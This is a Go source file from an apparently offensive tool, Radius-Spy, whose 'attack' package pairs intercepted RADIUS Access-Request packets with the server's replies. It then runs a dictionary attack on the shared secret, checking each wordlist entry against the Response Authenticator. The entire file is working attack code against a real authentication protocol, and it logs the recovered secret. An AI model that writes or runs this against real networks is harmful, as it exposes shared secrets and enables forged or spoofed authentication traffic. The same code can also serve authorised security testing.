package attack

import (
	"bufio"
	"net"
	"os"

	"github.com/famez/Radius-Spy/radius"
	"github.com/famez/Radius-Spy/session"

	"github.com/golang/glog"
)

//This structure is used to keep track of the previously received Radius packets from a given source,
//because we need a pair of packets Access-Request, Access-Challenge to carry out the dictionary attack.
type packetInfo struct {
	packet *radius.RadiusPacket
	addr   net.UDPAddr
}

var cachedPackets []packetInfo

//This function will store the packet passed as argument in case that the packet is of
//type Access-Request. Otherwise, it will compare the identifier of the Radius packet.
//If the identifier matches with one of the stored Access-Request messages, a pair of Access-Request,
//Access-Challenge messages is available and the dictionary attack can start by calling the function trySecrets()
func GuessSecret(packet *radius.RadiusPacket, client net.UDPAddr, server net.UDPAddr, clientToServer bool) (bool, string) {

	switch packet.GetCode() {
	case radius.AccessRequest:
		if clientToServer { //Verify that the packet does not come from the RADIUS server

			for _, packetInfo := range cachedPackets {
				if packetInfo.addr.IP.Equal(client.IP) && packetInfo.addr.Port == client.Port {
					return false, "" //If client already treated, do not add it to the slice
				}

			}

			packetInfo := packetInfo{
				packet: packet,
				addr:   client,
			}

			cachedPackets = append(cachedPackets, packetInfo)
		}

	case radius.AccessAccept, radius.AccessChallenge, radius.AccessReject:

		if clientToServer || cachedPackets == nil {
			return false, "" //Something went wrong
		}

		for index, packetInfo := range cachedPackets {
			if packetInfo.packet.GetCode() == radius.AccessRequest && packetInfo.packet.GetId() == packet.GetId() &&
				packetInfo.addr.IP.Equal(client.IP) && packetInfo.addr.Port == client.Port { //Match request-response

				request := packetInfo.packet

				//Delete request once found.
				copy(cachedPackets[index:], cachedPackets[index+1:])
				cachedPackets = cachedPackets[:len(cachedPackets)-1]

				//At this point, we have pair of packets request-response

				config := session.GetConfig()
				return trySecrets(request, packet, config.GetSecretsFile(), client)

			}
		}

	}

	return false, ""

}

//This function tries to guess the shared secret between NAS and authentication
//server used in the Radius protocol by calculating the Authenticator field for
//an Access-Challenge message and comparing it with the real value in the message
func trySecrets(request *radius.RadiusPacket, response *radius.RadiusPacket, secretFile string, client net.UDPAddr) (bool, string) {

	file, err := os.Open(secretFile)
	if err != nil {
		glog.V(1).Infoln(err)
		return false, ""
	}
	defer file.Close()

	defer glog.V(2).Infoln("Secret scanner finished for client ", client)

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {

		secret := scanner.Text()

		glog.V(2).Infoln("Trying secret", secret)

		glog.V(2).Infoln("Response packet. Request Auth message:", request.GetAuthenticator())
		success, respAuth := radius.CalculateResponseAuth(response, request.GetAuthenticator(), secret)

		if success {
			glog.V(2).Infoln("Real response auth ", response.GetAuthenticator(), "guessed response auth", respAuth)

			if response.GetAuthenticator() == respAuth {
				glog.V(1).Infoln("Match!! Secret has been broken!!!", "Secret is ", secret)

				return true, secret

			}
		}

	}

	return false, ""

}
